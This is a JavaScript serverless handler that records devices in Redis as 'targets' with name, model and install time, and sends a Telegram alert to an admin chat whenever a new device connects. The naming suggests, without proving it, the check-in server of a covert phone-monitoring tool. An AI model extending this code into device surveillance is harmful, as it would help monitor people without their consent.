import { Redis } from '@upstash/redis';

const redis = Redis.fromEnv();
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { device_id, device_name, phone_model } = req.body;
    if (!device_id) return res.status(400).json({ error: 'Missing device_id' });

    const deviceKey = `device:${device_id}`;
    const existing = await redis.hgetall(deviceKey);
    
    await redis.hset(deviceKey, {
        target_id: device_id,
        target_name: device_name || 'Unknown',
        phone_model: phone_model || 'Unknown',
        installed_at: new Date().toISOString()
    });

    // Kalo device baru, kirim notif ke Telegram
    if (!existing || !existing.target_id) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: `🆕 *DEVICE BARU TERHUBUNG!*\n\n` +
                          `📱 Nama: ${device_name || 'Unknown'}\n` +
                          `🆔 ID: \`${device_id}\`\n` +
                          `📦 Model: ${phone_model || 'Unknown'}\n` +
                          `🕐 ${new Date().toLocaleString('id-ID')}`,
                    parse_mode: 'Markdown'
                })
            });
        } catch (e) {
            console.error('Telegram notif error:', e);
        }
    }

    console.log(`[NEW DEVICE] ${device_id} - ${device_name}`);
    return res.json({ status: 'ok' });
}